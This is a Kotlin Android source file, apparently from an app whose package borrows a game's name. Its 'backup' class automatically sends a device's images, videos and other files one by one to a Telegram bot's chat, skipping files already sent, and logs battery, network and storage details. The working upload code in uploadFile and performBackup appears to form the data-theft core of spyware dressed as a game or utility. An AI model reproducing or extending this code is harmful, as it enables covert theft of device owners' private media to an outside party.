package com.service.assasinscreed02.utils

import android.content.Context
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.security.MessageDigest
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import com.service.assasinscreed02.repository.BackupRepository
import com.service.assasinscreed02.database.BackupFile
import com.service.assasinscreed02.database.BackupSession
import com.service.assasinscreed02.database.DeviceStats

class MemoryOptimizedBackup(private val context: Context) {
    private val repository = BackupRepository(context)
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
        .build()
    
    companion object {
        private const val TAG = "MemoryOptimizedBackup"
        private const val BUFFER_SIZE = 8192 // 8KB buffer
        private const val MAX_FILE_SIZE_MB = 100 // 100MB max file size
        private const val CHUNK_SIZE_MB = 10 // 10MB chunks for large files
        private const val DELAY_BETWEEN_FILES_MS = 1000L
        private const val DELAY_BETWEEN_CHUNKS_MS = 500L
    }
    
    data class BackupResult(
        val success: Boolean,
        val filesProcessed: Int,
        val filesSuccess: Int,
        val filesFailed: Int,
        val totalSize: Long,
        val errorMessage: String? = null
    )
    
    suspend fun performBackup(
        files: List<File>,
        token: String,
        chatId: String,
        sessionType: String = "automatic"
    ): BackupResult = withContext(Dispatchers.IO) {
        val sessionId = repository.insertSession(
            BackupSession(
                sessionType = sessionType,
                status = "running"
            )
        )
        
        var filesProcessed = 0
        var filesSuccess = 0
        var filesFailed = 0
        var totalSize = 0L
        var errorMessage: String? = null
        
        try {
            Log.d(TAG, "Iniciando backup de ${files.size} archivos")
            
            for (file in files) {
                try {
                    if (!file.exists() || !file.canRead()) {
                        Log.w(TAG, "Archivo no accesible: ${file.name}")
                        filesFailed++
                        continue
                    }
                    
                    val fileSize = file.length()
                    if (fileSize == 0L) {
                        Log.w(TAG, "Archivo vacío: ${file.name}")
                        filesFailed++
                        continue
                    }
                    
                    // Verificar si el archivo ya fue subido
                    val fileHash = calculateFileHash(file)
                    val existingFile = repository.getFileByHash(fileHash)
                    if (existingFile != null) {
                        Log.d(TAG, "Archivo ya subido: ${file.name}")
                        filesProcessed++
                        continue
                    }
                    
                    // Determinar tipo de archivo
                    val fileType = getFileType(file)
                    
                    // Crear entrada en la base de datos
                    val backupFile = BackupFile(
                        fileName = file.name,
                        filePath = file.absolutePath,
                        fileHash = fileHash,
                        fileSize = fileSize,
                        fileType = fileType,
                        uploadStatus = "pending"
                    )
                    
                    val fileId = repository.insertFile(backupFile)
                    if (fileId == -1L) {
                        Log.e(TAG, "Error insertando archivo en BD: ${file.name}")
                        filesFailed++
                        continue
                    }
                    
                    // Enviar archivo a Telegram
                    val uploadSuccess = if (fileSize > MAX_FILE_SIZE_MB * 1024 * 1024) {
                        uploadLargeFile(file, token, chatId, fileId)
                    } else {
                        uploadFile(file, token, chatId, fileId)
                    }
                    
                    if (uploadSuccess) {
                        filesSuccess++
                        totalSize += fileSize
                        Log.d(TAG, "Archivo enviado exitosamente: ${file.name}")
                    } else {
                        filesFailed++
                        Log.e(TAG, "Error enviando archivo: ${file.name}")
                    }
                    
                    filesProcessed++
                    
                    // Delay entre archivos para evitar sobrecarga
                    delay(DELAY_BETWEEN_FILES_MS)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                    filesFailed++
                    errorMessage = e.message
                }
            }
            
            // Actualizar sesión
            val session = repository.getSessionById(sessionId)
            session?.let {
                repository.updateSession(it.copy(
                    endTime = System.currentTimeMillis(),
                    filesProcessed = filesProcessed,
                    filesSuccess = filesSuccess,
                    filesFailed = filesFailed,
                    totalSize = totalSize,
                    status = if (filesFailed == 0) "completed" else "completed_with_errors"
                ))
            }
            
            // Guardar estadísticas del dispositivo
            saveDeviceStats()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en backup: ${e.message}")
            errorMessage = e.message
            
            // Actualizar sesión con error
            val session = repository.getSessionById(sessionId)
            session?.let {
                repository.updateSession(it.copy(
                    endTime = System.currentTimeMillis(),
                    status = "failed"
                ))
            }
        }
        
        BackupResult(
            success = filesFailed == 0,
            filesProcessed = filesProcessed,
            filesSuccess = filesSuccess,
            filesFailed = filesFailed,
            totalSize = totalSize,
            errorMessage = errorMessage
        )
    }
    
    private suspend fun uploadFile(file: File, token: String, chatId: String, fileId: Long): Boolean {
        return try {
            val requestBody = file.asRequestBody(getMediaType(file).toMediaTypeOrNull())
            val request = Request.Builder()
                .url("https://api.telegram.org/bot$token/sendDocument")
                .post(
                    MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", chatId)
                        .addFormDataPart("document", file.name, requestBody)
                        .build()
                )
                .build()
            
            val response = client.newCall(request).execute()
            val success = response.isSuccessful
            
            if (success) {
                val responseBody = response.body?.string()
                val messageId = extractMessageId(responseBody)
                
                // Actualizar archivo en BD
                val backupFile = repository.getFileByHash(calculateFileHash(file))
                backupFile?.let {
                    repository.updateFile(it.copy(
                        uploadStatus = "success",
                        telegramMessageId = messageId
                    ))
                }
            } else {
                // Marcar como fallido
                val backupFile = repository.getFileByHash(calculateFileHash(file))
                backupFile?.let {
                    repository.updateFile(it.copy(
                        uploadStatus = "failed",
                        errorMessage = "HTTP ${response.code}"
                    ))
                }
            }
            
            response.close()
            success
            
        } catch (e: Exception) {
            Log.e(TAG, "Error subiendo archivo ${file.name}: ${e.message}")
            
            // Marcar como fallido
            val backupFile = repository.getFileByHash(calculateFileHash(file))
            backupFile?.let {
                repository.updateFile(it.copy(
                    uploadStatus = "failed",
                    errorMessage = e.message
                ))
            }
            
            false
        }
    }
    
    private suspend fun uploadLargeFile(file: File, token: String, chatId: String, fileId: Long): Boolean {
        // Para archivos grandes, implementar lógica de chunks si es necesario
        // Por ahora, usar el método normal pero con más tiempo de espera
        Log.d(TAG, "Subiendo archivo grande: ${file.name} (${file.length() / 1024 / 1024}MB)")
        
        val result = uploadFile(file, token, chatId, fileId)
        
        // Delay adicional para archivos grandes
        delay(DELAY_BETWEEN_CHUNKS_MS)
        
        return result
    }
    
    private fun calculateFileHash(file: File): String {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val buffer = ByteArray(BUFFER_SIZE)
            var bytesRead: Int
            
            FileInputStream(file).use { fis ->
                while (fis.read(buffer).also { bytesRead = it } != -1) {
                    md.update(buffer, 0, bytesRead)
                }
            }
            
            val digest = md.digest()
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de ${file.name}: ${e.message}")
            file.absolutePath + "_" + file.lastModified()
        }
    }
    
    private fun getFileType(file: File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg", "png", "gif", "bmp", "webp" -> "image"
            "mp4", "mov", "avi", "mkv", "wmv", "flv", "webm" -> "video"
            else -> "other"
        }
    }
    
    private fun getMediaType(file: File): String {
        val extension = file.extension.lowercase()
        return when (extension) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "mp4" -> "video/mp4"
            "mov" -> "video/quicktime"
            "avi" -> "video/x-msvideo"
            else -> "application/octet-stream"
        }
    }
    
    private fun extractMessageId(responseBody: String?): String? {
        return try {
            if (responseBody != null) {
                val json = org.json.JSONObject(responseBody)
                if (json.getBoolean("ok")) {
                    val result = json.getJSONObject("result")
                    result.getString("message_id")
                } else null
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "Error extrayendo message ID: ${e.message}")
            null
        }
    }
    
    private suspend fun saveDeviceStats() {
        try {
            val stats = DeviceStats(
                batteryLevel = getBatteryLevel(),
                isCharging = isCharging(),
                networkType = getNetworkType(),
                freeStorage = getFreeStorage(),
                totalStorage = getTotalStorage(),
                wifiConnected = isWifiConnected()
            )
            repository.insertStats(stats)
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando estadísticas: ${e.message}")
        }
    }
    
    private fun getBatteryLevel(): Int {
        return try {
            val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level != -1 && scale != -1) {
                (level * 100 / scale.toFloat()).toInt()
            } else 0
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo nivel de batería: ${e.message}")
            0
        }
    }
    
    private fun isCharging(): Boolean {
        return try {
            val batteryIntent = context.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
            val status = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            status == android.os.BatteryManager.BATTERY_STATUS_CHARGING || 
            status == android.os.BatteryManager.BATTERY_STATUS_FULL
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando estado de carga: ${e.message}")
            false
        }
    }
    
    private fun getNetworkType(): String {
        return try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return "none"
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "none"
            
            when {
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
                capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "mobile"
                else -> "other"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo tipo de red: ${e.message}")
            "unknown"
        }
    }
    
    private fun isWifiConnected(): Boolean {
        return getNetworkType() == "wifi"
    }
    
    private fun getFreeStorage(): Long {
        return try {
            val stat = android.os.StatFs(android.os.Environment.getExternalStorageDirectory().path)
            stat.availableBlocksLong * stat.blockSizeLong
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo almacenamiento libre: ${e.message}")
            0L
        }
    }
    
    private fun getTotalStorage(): Long {
        return try {
            val stat = android.os.StatFs(android.os.Environment.getExternalStorageDirectory().path)
            stat.blockCountLong * stat.blockSizeLong
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo almacenamiento total: ${e.message}")
            0L
        }
    }
} 